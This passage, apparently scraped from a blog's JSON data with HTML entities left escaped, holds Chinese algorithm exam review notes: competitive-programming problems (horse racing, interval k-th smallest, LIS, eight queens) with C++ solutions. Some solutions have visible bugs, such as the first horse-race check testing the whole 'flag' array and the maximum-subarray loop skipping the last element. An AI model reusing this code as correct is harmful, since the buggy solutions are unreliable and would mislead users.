tree student 样例输出1boy city student tree 思路水题，按照字典序排列后输出即可 代码1234567891011121314151617#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;string s[1015];int main()&#123; int n; cin&gt;&gt;n; for(int i&#x3D;0;i&lt;n;++i)&#123; cin&gt;&gt;s[i]; &#125; sort(s,s+n); for(int i&#x3D;0;i&lt;n;++i)&#123; cout&lt;&lt;s[i]&lt;&lt;&#39; &#39;; &#125;&#125; 渊子赛马题目描述赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。 输入输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。 输出若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。 样例输入123456752 3 3 4 51 2 3 4 542 2 1 22 2 3 10 样例输出12YESNO 思路先排序，遍历对手的马，找到刚好能打败对手的马，然后把这匹马标记（不能用了）num++，循环，最后判断num是不是大于n/2+1。 代码123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;int s[1015];int d[1015];int flag[1015];int main()&#123; int n; while(cin&gt;&gt;n&amp;&amp;n!=0)&#123; for(int i=0;i&lt;n;++i)&#123; cin&gt;&gt;s[i];//我的马 &#125; for(int i=0;i&lt;n;++i)&#123; cin&gt;&gt;d[i];//对手的马 &#125; sort(s,s+n); sort(d,d+n); int num=0; for(int i=0;i&lt;n;++i)&#123; //遍历对手的马 for(int j=0;j&lt;n;++j)&#123; if(s[j]&gt;d[i]&amp;&amp;flag!=0)&#123; num++; flag[j]=1; break; &#125; &#125; &#125; if(num&gt;n/2+1) cout&lt;&lt;\"YES\"&lt;&lt;endl; else cout&lt;&lt;\"NO\"&lt;&lt;endl; &#125;&#125; 区间第K小题目描述花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。 例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。 输入第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述 第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9) 数据保证数列b中的元素个数不少于k个 输出输出一个数，表示数列b中的第k小的数 样例输入124 35 3 4 9 样例输出19 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//说实话，没看懂这个代码，可能是我太菜了吧#include&lt;bits/stdc++.h&gt;using namespace std;const int N = 100005;int a[N];int n, k;long long max_position(int x)&#123; long long result = 0; int l = 0, r = -1, num = 0; while (r &lt; n) &#123; if (num &lt; k) &#123; if (a[r + 1] &lt;= x)num++; r++; &#125; else &#123; result += n - r; if (a[l] &lt;= x)num--; l++; &#125; &#125; return result;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; k; int*b=new int[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; b[i] = a[i]; &#125; sort(b, b + n); int len = unique(b, b + n) - b; int l = 0, r = len - 1; int ans = 0; while (l &lt;= r) &#123; int mid = (l + r) / 2; long long ret = max_position(b[mid]); if (ret &gt;= k) &#123; ans = b[mid]; r = mid - 1; &#125; else l = mid + 1; &#125; cout &lt;&lt; ans; return 0;&#125; 元素整除问题题目描述输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。 输入输入20个整数 输出按输入顺序输出符合要求的数字，每行输出一个整数。 样例输入12 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 样例输出12345678910111246891012141516182021 代码123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;int a[20];int b[20];int main()&#123; for (int i = 0; i &lt; 20;++i)&#123; cin &gt;&gt; a[i]; b[i] = a[i]; &#125; sort(b, b + 20); for (int i = 0; i &lt; 20;++i)&#123; bool flag = false; for (int j = 0; j &lt; 20;++j)&#123; if(a[i]&gt;b[j])&#123; if(a[i]%b[j]==0)&#123; flag = true; break; &#125; &#125; else&#123; break; &#125; &#125; if(flag) cout &lt;&lt; a[i] &lt;&lt; endl; &#125; return 0;&#125; 内部收益率题目描述 输入 输出对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。 样例输入123451-1 22-8 6 90 样例输出121.000.50 代码12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;int main()&#123; int n, f, CF[12]; while (cin&gt;&gt;n &amp;&amp; n != 0) &#123; cin &gt;&gt; f; double mid, high = 10000, low = -1, r, k, sum; for (int i = 0; i &lt; n; i++) cin &gt;&gt; CF[i]; while (high - low &gt; 1.0e-6) &#123; mid = (high + low) / 2; k = 1; sum = 0; for (int j = 0; j &lt; n; j++) &#123; k *= (1.0 / (1 + mid)); sum += CF[j] * k; &#125; if (sum + f &gt; 0) low = mid; else high = mid; &#125; cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; mid &lt;&lt; endl; &#125; return 0;&#125; 问题 J: 奶牛的聚会题目描述农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。 输入第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。 对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。 输出对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。 样例输入1234567150.9 21.4 43.1 16.2 18.3 2 样例输出1Case #1: 300 思路三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;math.h&gt;using namespace std;typedef long long ll;const int maxn = 50010;double Si[maxn], wi[maxn];int n, Ca;//计算聚会位置在pos时的消极情绪之和double ans(double pos)&#123; double sum = 0; for (int i = 0; i &lt; n; i++) &#123; //计算每个奶牛距离聚会位置的距离(非负) double dist = Si[i] - pos; if (dist &lt; 0) dist = -dist; sum += pow(dist, 3) * wi[i]; &#125; return sum;&#125;int main()&#123; cin &gt;&gt; Ca; for (int i = 1; i &lt;= Ca; i++) &#123; cin &gt;&gt; n; for (int j = 0; j &lt; n; j++) &#123; cin &gt;&gt; Si[j] &gt;&gt; wi[j]; &#125; //找到坐标位置最小的奶牛 double low = Si[0]; for (int k = 0; k &lt; n; k++) if (Si[k] &lt; low) low = Si[k]; //找到坐标位置最小的奶牛 double high = Si[0]; for (int l = 0; l &lt; n; l++) if (Si[l] &gt; high) high = Si[l]; //三分查找法确定最终位置 while (high - low &gt; 1e-7) &#123; double m1 = (high + low) / 2.0; double m2 = (m1 + high) / 2.0; if (ans(m1) &gt; ans(m2)) low = m1; else high = m2; &#125; cout &lt;&lt; \"Case #\" &lt;&lt; i &lt;&lt; \": \" &lt;&lt; ll(ans(low) + 0.5) &lt;&lt; endl; &#125; return 0;&#125; 问题 E: 光合作用题目描述蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？ 输入第一行输入一个整数 T，表示测试数据的组数。 每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。 接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。 输出对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。 样例输入1234567827 1 244 4 11234 样例输出123456789101100121001111 思路二分法 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;using namespace std;/*********************************************************************************************lower_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于或等于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。upper_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。********************************************************************************************/const int maxn = 1e5 + 5;int x[maxn];int main()&#123; int T; cin &gt;&gt; T; while (T--) &#123; int n, m, h; cin &gt;&gt; n &gt;&gt; m &gt;&gt; h; for (int i = 1; i &lt;= m; i++) &#123; cin &gt;&gt; x[i]; &#125; sort(x + 1, x + m + 1); for (int i = 1; i &lt;= n; i++) &#123; int ans = 0; int cnt = lower_bound(x + 1, x + m + 1, i) - x; if (cnt == 1 &amp;&amp; m != 0) &#123; ans = max(ans, h - x[cnt] + i); &#125; else if (cnt == m + 1 &amp;&amp; m != 0) &#123; ans = max(ans, h - i + x[cnt - 1]); &#125; else if (m != 0) &#123; ans = max(0, max(h - i + x[cnt - 1], h - x[cnt] + i)); &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"算法考试复习2","slug":"算法考试复习2","date":"2020-10-28T06:45:52.000Z","updated":"2020-12-03T13:55:29.312Z","comments":true,"path":"2020/10/28/algorithm2/","link":"","permalink":"http://aotle.top/2020/10/28/algorithm2/","excerpt":"借鉴了学长们的研究成果","text":"借鉴了学长们的研究成果 0x01 单词排序题目描述小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。 输入输入包含两行。 第一行仅包括一个正整数N(0&lt;N≤26)。 第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。 单个单词长度不超过1010。 输出输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。 样例输入124city boy tree student 样例输出1boy city student tree 代码123456789101112131415161718192021#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;using namespace std;typedef long long ll;string res[30];int main()&#123; int n; cin &gt;&gt; n; for(int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; res[i]; &#125; sort(res, res + n); for (int i = 0; i &lt; n;++i)&#123; cout &lt;&lt; res[i] &lt;&lt; ' '; &#125; return 0;&#125; 0x02 求数组的最长递减序列题目描述给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。 输入输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。 输出输出最长递减子序列，数字之间有一个空格。 样例输入1289 4 3 2 5 4 3 2 样例输出19 5 4 3 2 代码12参考：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;longest-increasing-subsequence&#x2F;solution&#x2F;zui-chang-shang-sheng-zi-xu-lie-dong-tai-gui-hua-2&#x2F;https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;number-of-longest-increasing-subsequence&#x2F;solution&#x2F;dong-tai-gui-hua-jie-zui-chang-zi-xu-lie-zi-chua-4&#x2F; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;#include &lt;stack&gt;using namespace std;typedef long long ll;int n;int dp[1005]=&#123;1&#125;, nums[1005], res[1005]=&#123;-1&#125;; //oj好像没办法这样初始化int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; nums[i]; &#125; for (int i = 0; i &lt; n;++i)&#123; dp[i] = 1; res[i] = -1; for (int j = 0; j &lt; i;++j)&#123; if(nums[i]&lt;nums[j]&amp;&amp;dp[j]+1&gt;dp[i]) //严格递减 &#123; dp[i] = dp[j] + 1; res[i] = j;//方便找到字串 &#125; &#125; &#125; int maxn = 0; int num = 0; for(int i=0;i&lt;n;i++) &#123; if(dp[i]&gt;maxn) &#123; maxn=dp[i]; num=i; //找到最优解 &#125; &#125; stack&lt;int&gt; a; a.push(nums[num]); while(res[num]!=-1)&#123; a.push(nums[res[num]]); num = res[num]; &#125; while(!a.empty())&#123; cout &lt;&lt; a.top() &lt;&lt; ' '; a.pop(); &#125;&#125; 0x03 矩形滑雪场题目描述zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。 输入第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。 输出仅一行:输出1个整数，表示可以滑行的最大长度。 样例输入1234565 51 2 3 4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9 样例输出125 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;#include &lt;stack&gt;#include&lt;cmath&gt;using namespace std;typedef long long ll;struct node&#123; int x, y, h;&#125; a[10005];bool cmp(node a,node b)&#123; return a.h&lt;b.h;&#125;int dp[10005];bool check(node a,node b)&#123;//必须满足严格减小才可以滑下去，所以这里加判定 if((b.h&gt;a.h)&amp;&amp;((a.x==b.x&amp;&amp;abs(a.y-b.y)==1)||(a.y==b.y&amp;&amp;abs(a.x-b.x)==1))) return true; return false;&#125;int main()&#123; int num = 0; int m, n; cin &gt;&gt; m &gt;&gt; n; for(int i=1;i&lt;=m;i++) &#123; for(int j=1;j&lt;=n;j++) &#123; cin&gt;&gt;a[num].h; a[num].x=i; a[num].y=j; num++; &#125; &#125; sort(a, a + num, cmp); int mmax = 1;//必定经过自己 for (int i = 0; i &lt; num;++i)&#123; dp[i] = 1; for (int j = 0; j &lt; i;++j)&#123; if(check(a[j],a[i])) dp[i] = max(dp[i], dp[j] + 1); &#125; mmax = max(dp[i], mmax); &#125; cout &lt;&lt; mmax &lt;&lt; endl; return 0;&#125; 0x04 homework题目描述临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。 暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。 I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。 现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。 输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。 输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位 提示：float 的精度可能不够，你应该使用 double 类型。 样例输入1234564 204 105 2210 31 20 0 样例输出137.00 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int m,n; int a[20],b[20]; double ma[20]; while(cin&gt;&gt;m&gt;&gt;n&amp;&amp;m!=0&amp;&amp;n!=0) &#123; double maxn=0; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;a[i]; cin&gt;&gt;b[i]; ma[i]=double(b[i])/a[i]; &#125; int f=0; int s; double vm; while(1) &#123; if(f==m) break; vm=0; for(int i=0;i&lt;m;i++) &#123; if(ma[i]&gt;vm) &#123; vm=ma[i]; s=i; &#125; &#125; if(n&lt;a[s]) &#123; maxn=maxn+n*ma[s]; break; &#125; else &#123; maxn=maxn+b[s]; n=n-a[s]; ma[s]=0; f++; &#125; &#125; cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;maxn&lt;&lt;endl; &#125;&#125; 0x05 区间包含问题题目描述已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。 输入输入包含多组测试数据，对于每组测试数据： 第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。 接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 。 接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 。 输出对于每组测试数据，输出 m 行，每行包含一个整数。 数据过大请使用快速输入输出。 样例输入123456784 31 32 41 41 21 21 31 4 样例输出123112 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;iostream&gt;#include&lt;algorithm&gt;#define inf 0x7fffffffusing namespace std;typedef struct node&#123; int l; int r;&#125;node;bool cmp(node a, node b)&#123; return a.r &lt; b.r;&#125;int main()&#123; std::ios::sync_with_stdio(false); int n, m; while (cin &gt;&gt; n &gt;&gt; m) &#123; node *nnum = new node[n]; node *mnum = new node[m]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; nnum[i].l &gt;&gt; nnum[i].r; &#125; for (int i = 0; i &lt; m; i++) &#123; cin &gt;&gt; mnum[i].l &gt;&gt; mnum[i].r; &#125; sort(nnum, nnum + n, cmp); for (int i = 0; i &lt; m; i++) &#123; int res = 0; int k = mnum[i].l; //K初始的时候等于m数组的左边界 for (int j = 0; j &lt; n; j++) &#123; if ((nnum[j].l &gt;= k)) &#123; if (nnum[j].r &lt;= mnum[i].r) &#123; res++; k = nnum[j].r; //每次更新成n数组的右边界 &#125; else //右边界一旦超过，直接扔掉后面的部分结束质询 &#123; break; &#125; &#125; &#125; cout &lt;&lt; res &lt;&lt; endl; &#125; delete[] nnum; delete[] mnum; &#125;&#125; 0x06 最长子序列题目描述在一个数组中找出和最大的连续几个数。（至少包含一个数） 例如： 数组A[] = [-2,1,-3,4,-1,2,1,-5,4]，则连续的子序列[4,-1,2,1]有最大的和6. 输入第一行输入一个不超过1000的整数n。 第二行输入n个整数A[i]。 输出输出一个整数，表示最大的和。 样例输入1231 1 -2 样例输出12 代码1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;#include &lt;stack&gt;#include&lt;cmath&gt;using namespace std;int main()&#123; int n; int a[1005]; int b[1005]=&#123;0&#125;; cin &gt;&gt; n; int sum = 0; for (int i = 1; i &lt;= n;i++) &#123; cin &gt;&gt; a[i]; &#125; for (int i = 1; i &lt; n;++i)&#123; b[i] = max(b[i - 1] + a[i], a[i]); sum = max(b[i], sum); &#125; cout &lt;&lt; sum; return 0;&#125; 0x07 渊子赛马题目描述赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。 输入输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。 输出若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。 样例输入123456752 3 3 4 51 2 3 4 542 2 1 22 2 3 10 样例输出12YESNO 代码12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;#include &lt;stack&gt;using namespace std;typedef long long ll;int n;int a[1005];int b[1005];int main()&#123; while(cin&gt;&gt;n&amp;&amp;n!=0)&#123; for (int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; a[i]; &#125; for (int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; b[i]; &#125; sort(a, a + n); sort(b, b + n); int sum = 0; for (int i = 0; i &lt; n;++i)&#123; for (int j = 0; j &lt; n;++j)&#123; if(a[j]&gt;b[i])&#123; sum++; a[j] = 0; break; &#125; &#125; &#125; if(sum&gt;=n/2+1)&#123; cout &lt;&lt; \"YES\" &lt;&lt; endl; &#125; else cout &lt;&lt; \"NO\" &lt;&lt; endl; &#125; return 0;&#125; 0x08 最长上升子序列题目描述给定一个长度为n的字符串S（只包含小写字母），给出q次查询，对于每次查询x，求出以S[x]（下标从0开始）为起始的最长上升子序列的长度（严格增）。 输入第一行两个整数n,q(1&lt;=n,q&lt;=1e5)，意义见题目描述。 第二行一个长度为n的字符串S。 第三行q个整数x(0&lt;=x&lt;n)，表示q次查询。 输出输出q个数（以空格分割，行末有空格），表示以S[x]为起始的最长上升子序列的长度。 样例输入12310 3abbaaccbbd2 5 8 样例输出13 2 2 代码12345678910111213141516171819202122232425#include&lt;iostream&gt;using namespace std;int n,q;char a[100010];int ans[100010],p[30];int main()&#123; //cin&gt;&gt;n&gt;&gt;q; scanf(\"%d%d\",&amp;n,&amp;q); //cin&gt;&gt;a; scanf(\"%s\",a); for(int i=n-1;i&gt;=0;i--) &#123; ans[i]=1; for(int j=a[i]-'a'+1;j&lt;26;j++) ans[i]=max(ans[i],p[j]+1); p[a[i]-'a']=ans[i]; &#125; int x; while(q--) &#123; scanf(\"%d\",&amp;x); printf(\"%d \",ans[x]); &#125;&#125; 0x09 区间第K小题目描述花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。 例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。 输入第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述 第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9) 数据保证数列b中的元素个数不少于k个 输出输出一个数，表示数列b中的第k小的数 样例输入124 35 3 4 9 样例输出19 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//没看懂#include&lt;bits/stdc++.h&gt;using namespace std;const int N = 100005;int a[N];int n, k;long long max_position(int x)&#123; long long result = 0; int l = 0, r = -1, num = 0; while (r &lt; n) &#123; if (num &lt; k) &#123; if (a[r + 1] &lt;= x)num++; r++; &#125; else &#123; result += n - r; if (a[l] &lt;= x)num--; l++; &#125; &#125; return result;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; k; int*b=new int[n]; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; b[i] = a[i]; &#125; sort(b, b + n); int len = unique(b, b + n) - b; int l = 0, r = len - 1; int ans = 0; while (l &lt;= r) &#123; int mid = (l + r) / 2; long long ret = max_position(b[mid]); if (ret &gt;= k) &#123; ans = b[mid]; r = mid - 1; &#125; else l = mid + 1; &#125; cout &lt;&lt; ans; return 0;&#125; 0x0A 元素整除问题题目描述输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。 输入输入20个整数 输出按输入顺序输出符合要求的数字，每行输出一个整数。 样例输入12 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 样例输出12345678910111246891012141516182021 代码123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;#include &lt;iomanip&gt;#include&lt;algorithm&gt;#include &lt;stack&gt;#include&lt;cmath&gt;using namespace std;int main()&#123; int a[20],b[20]; for(int i=0;i&lt;20;i++) &#123; cin&gt;&gt;a[i]; b[i]=a[i]; &#125; sort(b,b+20); for(int i=0;i&lt;20;i++) &#123; //cout&lt;&lt;b[i]&lt;\" \"; int sign=0; for(int j=0;j&lt;20;j++) &#123; if(b[j]&lt;a[i]) &#123; if(a[i]%b[j]==0) sign=1; &#125; else break; &#125; if(sign==1) cout&lt;&lt;a[i]&lt;&lt;endl; &#125; return 0;&#125; 0x0B 八皇后问题题目描述努比亚和苏丹没有子女，所以他要从一些有集成资格的继承者中挑选一个出来继承王位。他希望这个继承者足够聪明，所以他准备了一个西洋棋盘，上面的每个格子中均有一个 1-99 的数字。他又准备了 8 个皇后棋子。 8 皇后的规则就是不能有任何棋子同行或者同列或者同斜线，在满足这个规则的同时，王位继承者还需要让 8 个皇后所在的位置的数字的和是最大的。 输入输入一个数字 k(k≤20)，代表棋盘的数量。 接下来有 k 个棋盘，每个棋盘有 64 个数字，分成 8 行 8 列输入，具体可见样例，每一个数字均小于 100。 输出每一个棋盘对应输出最大的数值， 一共输出 k行 样例输入12345678911 2 3 4 5 6 7 89 10 11 12 13 14 15 1617 18 19 20 21 22 23 2425 26 27 28 29 30 31 3233 34 35 36 37 38 39 4041 42 43 44 45 46 47 4848 50 51 52 53 54 55 5657 58 59 60 61 62 63 64 样例输出1260 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include&lt;math.h&gt;#include&lt;string.h&gt;#include&lt;algorithm&gt;using namespace std;int map[8][8],x[8],ans,sum;bool check(int xx,int yy)&#123; for(int i = 0; i &lt; xx; 